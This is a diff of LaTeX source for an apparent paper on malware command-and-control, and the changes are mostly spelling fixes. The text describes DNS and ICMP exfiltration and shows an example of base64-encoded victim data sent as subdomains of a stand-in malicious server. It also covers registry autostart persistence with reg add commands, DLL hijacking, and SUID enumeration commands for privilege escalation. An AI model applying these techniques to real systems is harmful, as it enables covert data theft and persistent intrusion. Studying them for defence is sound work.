 then the responder has the ability to insert data into the descriptive field. This is normally a field for contact information such as telephone number and email.
 The space here is much larger, allowing for 300 characters which is plenty for a compressed executable payload. This would be considered infiltration, and provides alternate options. \citep{DNSTunneling}
 
 \subsubsection{DNS Heartbeating}\label{DNSHeartbeat}
-As discussed in earlier sections of the paper, messages are sent to verify connectivity and system availablity, often with identifiable information. \ref{C2Channels}
+As discussed in earlier sections of the paper, messages are sent to verify connectivity and system availability, often with identifiable information. \ref{C2Channels}
 
-DNS has this capability, as so long as targeted detection or whitelists are not in place, DNS can eventually push any amount of data through infrastructure to the centralized server. This allows for a level of creatvity for how to solve problems.
+DNS has this capability, as so long as targeted detection or whitelists are not in place, DNS can eventually push any amount of data through infrastructure to the centralized server. This allows for a level of creativity for how to solve problems.
 The C2 master may have many victim machines connecting to it at once, how may it distinguish between them, while using DNS?
 
 Paloaltonetworks came up with an effective strategy, specific sections of data can be encoded into base64, and then pieced together and appended as a subdomain as discussed earlier. \citep{DNSTunneling}
@@ -888,12 +888,12 @@ MTQ1LjIyMi4xLjU2'V2luZG93czc='NTFOLTAuMVc='Sm9obiBEb2U='REJfU1ZS
 'NTMyZTRkNDItMmRlMi00NDg5LTg3NjEtOWYwYmMzMjk2NTJl.malicousServer.net
 \end{lstlisting}
 
-Varying length could be an issue, delimiation would solve this. A character that does not need to be escaped in base64 or DNS, but that is covert aesthetically would is ideal, such as the apostraphe used above. 
+Varying length could be an issue, delimitation would solve this. A character that does not need to be escaped in base64 or DNS, but that is covert aesthetically would is ideal, such as the apostrophe used above. 
 This is an area that has scope for improvement.
 
 \subsubsection{DNS C2 Control}\label{DNSControl}
-The identifiers above allow the botnet master to provide responces conditionally based on request sender and content. DNS inherintly resolves domain names to addresses, this is another potential attack vector.
-In the cases shown, the IP responce is not needed or not even read by the victim. The DNS requests are abitrary and serve to deliver data, rather than the intended purpose of being a mechanism for other protocols to work.
+The identifiers above allow the botnet master to provide responses conditionally based on request sender and content. DNS inherently resolves domain names to addresses, this is another potential attack vector.
+In the cases shown, the IP response is not needed or not even read by the victim. The DNS requests are arbitrary and serve to deliver data, rather than the intended purpose of being a mechanism for other protocols to work.
 This means that the IP address returned can be leveraged to hold a different meaning. These attacks assume control of a DNS server, and as a result what addresses are returned. \citep{DNSTunneling}
 
 Assuming we are using IPv4, there are 4,294,967,296 possible addresses. This means in turn that we have the same amount of potential commands, by assuming them as unique identifiers for commands. \citep{DNSTunneling}
@@ -913,7 +913,7 @@ Using the earlier actions as an example \ref{C2Channels}:
 There are tools capable of conducting such techniques; these include:
 \begin{enumerate}
     \item DnsCat2 - "This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol" \citep{dnscat2}
-    \item DNSExfiltrator - "Allows for transfering a file over a DNS request covert channel." \citep{DNSExfiltrator}
+    \item DNSExfiltrator - "Allows for transferring a file over a DNS request covert channel." \citep{DNSExfiltrator}
     \item Iodine - "IP over DNS tunneling client" \citep{iodine}
     \item DET - "Data Exfiltration Toolkit" \citep{DET}
 \end{enumerate}
@@ -929,10 +929,10 @@ There are tools capable of conducting such techniques; these include:
 %I have a lot of notes I need to copy over
 
 \subsection{ICMP}
-ICMP is a control message protocol for IP that lets a host ping another host to validate connectivity. This relies on the other side allowing ICMP, and that it responds. that ICMP allows for a similar kind of exfiltration to DNS. Exfiltration methodologies can be split into two categories, timing and storage based. The former uses time as the boolean measure as to a given status by manipualtion responce/request time, for example delaying responce by 3 seconds if clear text passwords exist.
+ICMP is a control message protocol for IP that lets a host ping another host to validate connectivity. This relies on the other side allowing ICMP, and that it responds. that ICMP allows for a similar kind of exfiltration to DNS. Exfiltration methodologies can be split into two categories, timing and storage based. The former uses time as the Boolean measure as to a given status by manipulation response/request time, for example delaying response by 3 seconds if clear text passwords exist.
 The latter relies on fields within the protocol having storage capacity for variable data for exfiltration. These tend to be unused or optional fields, with one process writing to them, and another stripping it out. The ICMP data payload inside the frame is the most obvious location, but it being under the ICMP banner, can help divert attention elsewhere. There are other less obvious places that data could be placed, but that is out of scope for this paper. \citep{ICMPExfiltration}
 
-Ping can be leveraged to specify it's 16 byte ECHO\_REQUEST field's contents. The source states that a simple Scapy Python script can be used in combination with timing and payload switches of the ping utility, to exfiltrate data under the ICMP protocol. This relies on compression of data into hexadecimal, and to then sneak that into intervaled bytes that the listener/sniffer on the malicous server will then strip and write to a file. \citep{pingExfil}
+Ping can be leveraged to specify it's 16 byte ECHO\_REQUEST field's contents. The source states that a simple Scapy Python script can be used in combination with timing and payload switches of the ping utility, to exfiltrate data under the ICMP protocol. This relies on compression of data into hexadecimal, and to then sneak that into intervaled bytes that the listener/sniffer on the malicious server will then strip and write to a file. \citep{pingExfil}
 
 For the purposes of this paper, DNS will be the focus, however, ICMP is a useful asset for the above use cases.
 
@@ -947,20 +947,20 @@ For the purposes of this paper, DNS will be the focus, however, ICMP is a useful
 Important for malware to have continued access, even after a reboot. I will try a few of these with a reverse shell. 
 We need triggers, these triggers should be fairly legit, with malformed payloads. These triggers should be automatic, or at least on something that would be done normally.
 
-Windows works by leaving files for both reference, logs and to speed proccess up. These either are intrinsic to how the OS works or simply have been left behind. 
+Windows works by leaving files for both reference, logs and to speed process up. These either are intrinsic to how the OS works or simply have been left behind. 
 These are great for finding evidence and purpose. We can prove that the criminal acted at a given time, on a given file etc... These are some useful areas. This is windows 10, but older ones are still out there, 7 upwards are very similar. We need to be able to recreate.
 
 \section{Registry Manipulation}
 A hive that is normally maintained by the system. You can change values and implant whatever you want in there. Here are some strategic places. 
 Many of these are ASEPs (AutoStart Extension Points), meaning they run without user interaction. The registry seems to have issues with wild wildcards, 
 in that it will run essentially anything under a given hive at it's respective time and permissions. It's a rootkit waiting to happen. 
-It's where forensic analysts will look first. When i'm testing this, I often use regedit.exe. Real malware wouldn't do this, it would do it via scripting. 
+It's where forensic analysts will look first. When I'm testing this, I often use regedit.exe. Real malware wouldn't do this, it would do it via scripting. 
 A few example of the reg command are below. 
 //expand upon with real scripting.
 
 
 \subparagraph{Startup Keys}
-Keys that point to folders, that can launch shortcuts and executables as the given user, often during login or reboot
+Keys that point to folders, that can launch shortcuts and executable as the given user, often during login or reboot
 \begin{lstlisting}[label=RegistryStartupKeys,caption=Registry Startup Key Locations]
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders //will default to carl in my case
 HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
@@ -1004,10 +1004,10 @@ Decodes to "autocheck autochk * aHdqEPamx", loads this on boot. This is the view
 
 \subparagraph{DLL Search Order Hijacking}
 If a process is executed, it will look in it's own folder first, and use it's DLL, even over a windows one, to overwrite it. If not, it will read the location of root, 
-to the destination with spaces, and means you can inject a dll where you know it will look before the real one. Even explorer.exe does this!
+to the destination with spaces, and means you can inject a DLL where you know it will look before the real one. Even explorer.exe does this!
 
 \subparagraph{AppInit\_DLLs}
-Everytime User32.dll is loaded by an exe, this string is read and modules are loaded that are listed. This is invoked a fair few times on system loadup from multiple initilized processes.
+Every-time User32.dll is loaded by an exe, this string is read and modules are loaded that are listed. This is invoked a fair few times on system load-up from multiple initialized processes.
 
 \subparagraph{Run & RunOnce Keys}
 \begin{lstlisting}[label=RegistryRun,caption=Registry Run Locations] 
@@ -1034,11 +1034,11 @@ reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
 %reference locations of registry info, evernote
 %find where I got this stuff from
 
-\section{Priviledge Escalation}
-The idea behind privilege escalation is that under the assumption that a user shell is granted, that shell can then be leveraged in a malcious way to gain higher privilege.
-Permissions are often exploited in order to escape user level contraints, often due to poor configuration. This varies from hijacking processes running as root (system in windows) to
-abusing scheduled tasks to run user defined code. The ultimate goal of priv esc is to leverge the highest user shell, from there; system level persistance mechanisms such as rootkits can be easily
-leveraged for deep persistance. 
+\section{Privilege Escalation}
+The idea behind privilege escalation is that under the assumption that a user shell is granted, that shell can then be leveraged in a malicious way to gain higher privilege.
+Permissions are often exploited in order to escape user level constraints, often due to poor configuration. This varies from hijacking processes running as root (system in windows) to
+abusing scheduled tasks to run user defined code. The ultimate goal of priv esc is to leverage the highest user shell, from there; system level persistence mechanisms such as rootkits can be easily
+leveraged for deep persistence. 
 
 \subsection{Command Injection}
 We can use command injection to run any command that user has available. This may include netcat or any allowed system command. This could all be prevented with a few steps. 
@@ -1048,17 +1048,17 @@ The following is possible otherwise. We could use this attack in a input that ru
 %an example?
 
 \subsection{Scheduler \& Permission Manipulation}
-Linux systems use cron, and windows systems use task scheduler. They both allow for administrators to automate tasks. The use case is usually for an on-boot task, or perodically ran for backups and other important jobs.
-THey save the administrator from having to run it manually, leaving them to do other jobs. They are invaluable for backup hygiene, as well as autostarting important programs. While these schedulers can run single commands, 
+Linux systems use cron, and windows systems use task scheduler. They both allow for administrators to automate tasks. The use case is usually for an on-boot task, or periodically ran for backups and other important jobs.
+They save the administrator from having to run it manually, leaving them to do other jobs. They are invaluable for backup hygiene, as well as auto-starting important programs. While these schedulers can run single commands, 
 they are often given scripts for which to run at their defined time. The programmer in this case does not have to worry about scheduling code, they let the OS sort it out with their defined settings. The script will do 'x'
 task, and will run through it's defined algorithm. 
 
 The problem arises in the permissions of the potentially variable file. The script will always run as the user chosen to run the task. This means that the script could be running as the system or root user without explicit knowledge, and as such
-, if exploited could also run arbitrary code. A particually nasty attack vector is the write permission of the script. If not secured so that only system level permissions can edit it, potentially any user can alter it.
+, if exploited could also run arbitrary code. A particularly nasty attack vector is the write permission of the script. If not secured so that only system level permissions can edit it, potentially any user can alter it.
 A user account could be hijacked, and then attempt to write to a scheduled script file. The user writing to the file may not be the one running it periodically, and as such any changes could be ran as the system/root user.
 
 \subsubsection{Sudo Permission Abuse:}
-There is another vulnrability in unix based systems called SUID exploitation in which programs have permissions assigned which say who can use the sudo command, as what user, on what binaries, that do not consider how that permission might be used. If a threat actor gained a shell onto a system as a given user, they could
+There is another vulnerability in UNIX based systems called SUID exploitation in which programs have permissions assigned which say who can use the sudo command, as what user, on what binaries, that do not consider how that permission might be used. If a threat actor gained a shell onto a system as a given user, they could
 use it to scan for 'S' bits on the permission section. The 'S' represents who can run a program as a different user, often without a password. The ability to run code as another, sometimes more privilege user means that there may be potential to abuse the application 
 into using it's power to grant a shell, under that user. GTFObins is a useful resource for this use case, it is a repository of known exploitation strings. \citep{GTFOBins}
 
@@ -1068,11 +1068,11 @@ find / -user <user> -perm -4000 -exec ls -ldb {} \;
 sudo -l
 \end{tcblisting}
 
-These are attack vectors, and as such means that there is a RCE vulnrability if left unsecured. An attacker could use it to leverage postion, pivot to another user, and plant persistance with a new user of privilege. Equally, persistance could be gained by binding to
-a 'trusted' process which has privilege. Applications like Windows File Explorer and Notepad have inherent trust and privilege in the system, and as such if malware binds their respective, it can remain there for sometime. Binding to a prcoess can be done using the above DLL hijacking,
-and also with the use of meterpreter modules once in the system. Meterpreter also has the benefit of using the hijacked process as a tunnel to run trhough commands through, and so can be leveraged to quickly comb through infrastructure. 
+These are attack vectors, and as such means that there is a RCE vulnerability if left unsecured. An attacker could use it to leverage position, pivot to another user, and plant persistence with a new user of privilege. Equally, persistence could be gained by binding to
+a 'trusted' process which has privilege. Applications like Windows File Explorer and Notepad have inherent trust and privilege in the system, and as such if malware binds their respective, it can remain there for sometime. Binding to a process can be done using the above DLL hijacking,
+and also with the use of meterpreter modules once in the system. Meterpreter also has the benefit of using the hijacked process as a tunnel to run through commands through, and so can be leveraged to quickly comb through infrastructure. 
 
-Implantation of SSH keys is a common tactic, they do not require passwords or a user, rather a public key that is unique to the hacker's device. A sample of how native applicaitons can be abused is Notepad itself. Notepad is a text editor in nature, meaning it has read and write permissions, of a given user. It is a convinient way of delivering malware payloads into local malware scripts, often with great speed.
+Implantation of SSH keys is a common tactic, they do not require passwords or a user, rather a public key that is unique to the hacker's device. A sample of how native applications can be abused is Notepad itself. Notepad is a text editor in nature, meaning it has read and write permissions, of a given user. It is a convenient way of delivering malware payloads into local malware scripts, often with great speed.
 
 
 % \section{Symbolic Locations}
